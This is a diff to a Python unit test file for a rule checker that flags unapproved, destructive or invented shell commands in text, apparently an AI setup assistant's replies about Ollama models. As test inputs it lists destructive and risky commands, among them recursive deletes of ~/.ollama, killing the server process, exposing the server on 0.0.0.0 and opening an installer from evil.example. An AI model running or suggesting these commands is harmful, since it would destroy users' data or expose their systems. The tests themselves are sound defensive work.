@@ -32,10 +32,46 @@ class CommandRules(unittest.TestCase):
         safe = [
             "`python3 -m pip install --user psutil`",
             "`ollama pull qwen2.5:1.5b`",
-            "`hf download Qwen/Qwen2.5-1.5B-Instruct-GGUF qwen2.5-1.5b-instruct-q4_k_m.gguf --local-dir models`",
-            "`/usr/bin/python3 --version`",
+            "`python3 --version`",
+            '`"$HOME/Applications/Ollama.app/Contents/Resources/ollama" pull qwen2.5:1.5b`',
+            "Then run ollama list to see what you have.",
         ]
         for text in safe:
+            with self.subTest(text=text):
+                self.assertEqual(rules(text), set())
+
+    def test_invented_or_unapproved_commands_are_flagged(self):
+        for text in ("`ollama download qwen2.5:0.5b`", "`pip install deepseek-r1`", "`find ~/.ollama -delete`",
+                     "`mv ~/.ollama ~/.Trash/`", "```bash\ncheck_install --up-to-step 1\n```", "`kill $(lsof -t -i:11434)`",
+                     "`curl -L -o m.gguf https://example.invalid/m.gguf`"):
+            with self.subTest(text=text):
+                self.assertIn("unapproved_command", rules(text))
+        for text in ("Drag Ollama to the Trash, then empty the Trash.", "Delete the models folder in Finder.", "Force quit Ollama."):
+            with self.subTest(text=text):
+                self.assertTrue(rules(text) & {"delete", "kill_process"})
+        self.assertIn("internal_tool", rules("Run check_hardware to see your CPU."))
+
+    def test_only_exact_registered_commands_pass(self):
+        # The old check approved any `python`/`open`/`export` line, which let invented commands through.
+        for text in ("`python -m ollama benchmark --model qwen2.5:1.5b`", "```bash\npython -c \"import shutil; shutil.rmtree('x')\"\n```",
+                     "```bash\nexport OLLAMA_HOST=0.0.0.0\n```", "`OLLAMA_HOST=0.0.0.0 ollama serve`", "`open https://evil.example/installer.pkg`",
+                     "`ollama pull llama3:latest`", "Run python -m ollama benchmark in your terminal.",
+                     "Type ollama pull mistral-large and wait.",
+                     # the app provider: only the listed apps, only the exact commands
+                     "`brew install --cask zoom`", "`brew install --cask visual-studio-code --force`", "`winget install --id Zoom.Zoom -e`",
+                     "`brew install wget`"):
+            with self.subTest(text=text):
+                self.assertTrue(rules(text) & {"unapproved_command", "not_allow_listed"}, rules(text))
+        for text in ("Run ollama pull qwen2.5:1.5b in your terminal.", "Check with ollama list, then continue.",
+                     "You need Python 3.11 or newer.", "Open Ollama, then come back here.",
+                     "`brew install --cask visual-studio-code`", "`winget uninstall --id Obsidian.Obsidian -e`"):
+            with self.subTest(text=text):
+                self.assertEqual(rules(text), set())
+
+    def test_python_examples_and_normal_lab_commands_stay_allowed(self):
+        for text in ("```python\ndef reverse(s):\n    return s[::-1]\n```", "```bash\npython3 -m venv .venv\n.venv/bin/python -m pip install -r requirements.txt\n```",
+                     "`ollama list`", "`lsof -i :11434`", "```\nAGENT_MODEL=qwen2.5:1.5b .venv/bin/python -m telemetry_agent.helper\n```",
+                     "Don't drag anything to the bin; the tool `recommend_model` picks for you."):
             with self.subTest(text=text):
                 self.assertEqual(rules(text), set())
 
